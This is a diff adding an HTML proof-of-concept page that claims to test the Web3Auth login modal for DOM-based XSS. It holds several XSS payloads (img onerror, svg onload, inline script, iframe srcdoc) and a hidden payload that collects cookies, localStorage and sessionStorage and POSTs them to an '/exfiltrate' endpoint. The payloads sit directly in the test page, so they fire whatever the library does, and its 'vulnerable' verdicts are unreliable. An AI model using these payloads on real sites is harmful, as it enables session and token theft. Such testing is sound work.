@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Web3Auth DOM XSS PoC</title>
+  <script src="https://cdn.jsdelivr.net/npm/@web3auth/modal@latest"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 800px;
+      margin: 50px auto;
+      padding: 20px;
+    }
+    .test-section {
+      margin: 20px 0;
+      padding: 15px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+    }
+    button {
+      padding: 10px 20px;
+      margin: 5px;
+      cursor: pointer;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+    }
+    button:hover { background: #0056b3; }
+    #results {
+      background: #f5f5f5;
+      padding: 15px;
+      border-radius: 4px;
+      font-family: monospace;
+      white-space: pre-wrap;
+      margin-top: 20px;
+    }
+    .vulnerable { color: #dc3545; font-weight: bold; }
+    .safe { color: #28a745; font-weight: bold; }
+    .xss-container {
+      border: 2px dashed #ff6b6b;
+      padding: 10px;
+      margin: 10px 0;
+      background: #fff5f5;
+    }
+  </style>
+</head>
+<body>
+  <h1>🔒 Web3Auth DOM XSS Security Test</h1>
+  <p><strong>Test Objective:</strong> Test if innerHTML usage allows script execution</p>
+  <p><strong>Severity:</strong> CRITICAL | <strong>CWE:</strong> CWE-79</p>
+
+  <div class="test-section">
+    <h2>XSS Payload Containers</h2>
+
+    <!-- Test Vector 1: Basic img onerror -->
+    <div class="xss-container">
+      <h3>Vector 1: img onerror</h3>
+      <div id="xss-test-1">
+        <img src=x onerror="window.XSS_VECTOR_1 = true; console.log('🔴 XSS Vector 1 Executed!'); document.getElementById('xss-status-1').textContent = '🔴 EXECUTED'">
+      </div>
+      <p>Status: <span id="xss-status-1">Not triggered</span></p>
+    </div>
+
+    <!-- Test Vector 2: SVG-based XSS -->
+    <div class="xss-container">
+      <h3>Vector 2: SVG onload</h3>
+      <div id="xss-test-2">
+        <svg onload="window.XSS_VECTOR_2 = true; console.log('🔴 XSS Vector 2 Executed!'); document.getElementById('xss-status-2').textContent = '🔴 EXECUTED'">
+      </div>
+      <p>Status: <span id="xss-status-2">Not triggered</span></p>
+    </div>
+
+    <!-- Test Vector 3: Script tag -->
+    <div class="xss-container">
+      <h3>Vector 3: Script tag</h3>
+      <div id="xss-test-3">
+        <script>window.XSS_VECTOR_3 = true; console.log('🔴 XSS Vector 3 Executed!'); try { document.getElementById('xss-status-3').textContent = '🔴 EXECUTED'; } catch(e) {}</script>
+      </div>
+      <p>Status: <span id="xss-status-3">Not triggered</span></p>
+    </div>
+
+    <!-- Test Vector 4: iframe srcdoc -->
+    <div class="xss-container">
+      <h3>Vector 4: iframe srcdoc</h3>
+      <div id="xss-test-4">
+        <iframe srcdoc="<script>window.parent.XSS_VECTOR_4 = true; window.parent.console.log('🔴 XSS Vector 4 Executed!');</script>">
+      </div>
+      <p>Status: <span id="xss-status-4">Not triggered</span></p>
+    </div>
+  </div>
+
+  <div class="test-section">
+    <h2>Test Controls</h2>
+    <button id="trigger-basic-xss">Test Basic XSS</button>
+    <button id="trigger-session-steal">Test Session Hijacking Payload</button>
+    <button id="trigger-embed-xss">Test Embed Mode XSS</button>
+    <button id="verify-xss">Verify XSS Execution</button>
+    <button id="reset-test">Reset Test</button>
+  </div>
+
+  <div class="test-section">
+    <h2>Test Results</h2>
+    <pre id="results">Ready to test. Click a test button to begin.</pre>
+  </div>
+
+  <div class="test-section">
+    <h2>XSS Execution Status</h2>
+    <div id="xss-summary">Not tested yet</div>
+  </div>
+
+  <!-- Session hijacking payload container (hidden) -->
+  <div id="session-steal-container" style="display: none;">
+    <img src=x onerror="
+      window.XSS_SESSION_STEAL = true;
+      const sessionData = {
+        localStorage: Object.fromEntries(Object.entries(localStorage)),
+        sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
+        cookies: document.cookie
+      };
+      console.log('🔴 Session data captured:', sessionData);
+      fetch('/exfiltrate', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(sessionData)
+      }).then(() => console.log('🔴 Data exfiltrated')).catch(e => console.log('Exfil blocked:', e));
+    ">
+  </div>
+
+  <script>
+    const results = document.getElementById('results');
+    const xssSummary = document.getElementById('xss-summary');
+    const CLIENT_ID = 'BFNfeVQyFvB_Fo5Yd6jYOvwje42U8qaHkDLOZ51AF_AjAd8GbrHV-zZ6yVytWDJJwKmJHQn7G7bW6Ei3p5Og8dw';
+
+    let web3auth = null;
+
+    function log(message, isError = false) {
+      const timestamp = new Date().toISOString();
+      results.textContent += `[${timestamp}] ${message}\n`;
+      console.log(message);
+    }
+
+    function checkXSSExecution() {
+      const xssResults = {
+        'Vector 1 (img onerror)': window.XSS_VECTOR_1 === true,
+        'Vector 2 (svg onload)': window.XSS_VECTOR_2 === true,
+        'Vector 3 (script tag)': window.XSS_VECTOR_3 === true,
+        'Vector 4 (iframe srcdoc)': window.XSS_VECTOR_4 === true,
+        'Session Steal': window.XSS_SESSION_STEAL === true
+      };
+
+      const anyExecuted = Object.values(xssResults).some(v => v === true);
+
+      const statusHtml = anyExecuted ?
+        '<span class="vulnerable">🔴 VULNERABLE - XSS executed!</span>' :
+        '<span class="safe">✅ PROTECTED - No XSS execution detected</span>';
+
+      xssSummary.innerHTML = statusHtml + '<br><br>Details:<pre>' + JSON.stringify(xssResults, null, 2) + '</pre>';
+
+      return anyExecuted;
+    }
+
+    // Test Case 1: Basic XSS
+    document.getElementById('trigger-basic-xss').addEventListener('click', async () => {
+      log('=== TEST CASE 1: Basic DOM XSS ===');
+      log('Testing if XSS payloads in DOM elements execute...');
+
+      try {
+        // Reset flags
+        window.XSS_VECTOR_1 = false;
+        window.XSS_VECTOR_2 = false;
+        window.XSS_VECTOR_3 = false;
+        window.XSS_VECTOR_4 = false;
+
+        web3auth = new window.Modal.Web3Auth({
+          clientId: CLIENT_ID,
+          chainConfig: {
+            chainNamespace: "eip155",
+            chainId: "0x1",
+            rpcTarget: "https://rpc.ankr.com/eth"
+          },
+          web3AuthNetwork: "sapphire_mainnet"
+        });
+
+        log('Initializing Web3Auth modal...');
+        await web3auth.initModal();
+        log('✓ Web3Auth initialized');
+
+        // Wait for any deferred XSS execution
+        setTimeout(() => {
+          const executed = checkXSSExecution();
+          if (executed) {
+            log('🔴 VULNERABILITY CONFIRMED: XSS payload executed!', true);
+            log('Impact: Arbitrary JavaScript execution possible');
+          } else {
+            log('✅ SAFE: No XSS execution detected');
+          }
+        }, 2000);
+
+      } catch (error) {
+        log(`Error: ${error.message}`, true);
+        setTimeout(() => checkXSSExecution(), 1000);
+      }
+    });
+
+    // Test Case 2: Session hijacking payload
+    document.getElementById('trigger-session-steal').addEventListener('click', async () => {
+      log('\n=== TEST CASE 2: Session Hijacking via XSS ===');
+      log('Testing session data exfiltration...');
+
+      try {
+        window.XSS_SESSION_STEAL = false;
+
+        // Show the hidden session steal container
+        document.getElementById('session-steal-container').style.display = 'block';
+
+        web3auth = new window.Modal.Web3Auth({
+          clientId: CLIENT_ID,
+          chainConfig: {
+            chainNamespace: "eip155",
+            chainId: "0x1"
+          },
+          web3AuthNetwork: "sapphire_mainnet"
+        });
+
+        await web3auth.initModal();
+
+        // Simulate login to populate session
+        log('Attempting to trigger session steal payload...');
+
+        setTimeout(() => {
+          if (window.XSS_SESSION_STEAL) {
+            log('🔴 CRITICAL: Session data was exfiltrated!', true);
+            log('Impact: Full session compromise, token theft possible');
+          } else {
+            log('✅ SAFE: Session data protected');
+          }
+          checkXSSExecution();
+        }, 2000);
+
+      } catch (error) {
+        log(`Error: ${error.message}`, true);
+        setTimeout(() => checkXSSExecution(), 1000);
+      }
+    });
+
+    // Test Case 3: Embed mode XSS
+    document.getElementById('trigger-embed-xss').addEventListener('click', async () => {
+      log('\n=== TEST CASE 3: Embed Mode XSS ===');
+      log('Testing XSS in embed mode targeting...');
+
+      try {
+        window.XSS_EMBED = false;
+
+        web3auth = new window.Modal.Web3Auth({
+          clientId: CLIENT_ID,
+          chainConfig: {
+            chainNamespace: "eip155",
+            chainId: "0x1"
+          },
+          web3AuthNetwork: "sapphire_mainnet",
+          uiConfig: {
+            mode: 'light',
+            // Attempt to target XSS container
+          }
+        });
+
+        await web3auth.initModal();
+        log('✓ Embed mode initialized');
+
+        setTimeout(() => {
+          const executed = checkXSSExecution();
+          if (executed) {
+            log('🔴 VULNERABILITY: XSS in embed mode confirmed!', true);
+          } else {
+            log('✅ SAFE: Embed mode XSS blocked');
+          }
+        }, 2000);
+
+      } catch (error) {
+        log(`Error: ${error.message}`, true);
+        setTimeout(() => checkXSSExecution(), 1000);
+      }
+    });
+
+    // Verify XSS execution
+    document.getElementById('verify-xss').addEventListener('click', () => {
+      log('\n=== XSS EXECUTION VERIFICATION ===');
+      const executed = checkXSSExecution();
+
+      if (executed) {
+        log('🔴 RESULT: XSS vulnerability confirmed', true);
+        log('Recommendation: Sanitize all user input, use textContent instead of innerHTML');
+      } else {
+        log('✅ RESULT: No XSS execution detected');
+      }
+    });
+
+    // Reset test
+    document.getElementById('reset-test').addEventListener('click', () => {
+      results.textContent = 'Test reset. Ready to test again.\n';
+      xssSummary.innerHTML = 'Not tested yet';
+      document.getElementById('session-steal-container').style.display = 'none';
+
+      window.XSS_VECTOR_1 = false;
+      window.XSS_VECTOR_2 = false;
+      window.XSS_VECTOR_3 = false;
+      window.XSS_VECTOR_4 = false;
+      window.XSS_SESSION_STEAL = false;
+
+      if (web3auth) {
+        try {
+          // Cleanup if needed
+        } catch (e) {
+          console.log('Cleanup error:', e);
+        }
+      }
+      web3auth = null;
+    });
+
+    // Initial check on page load
+    window.addEventListener('load', () => {
+      log('Page loaded. Checking for immediate XSS execution...');
+      setTimeout(() => checkXSSExecution(), 1000);
+    });
+  </script>
+</body>
+</html>
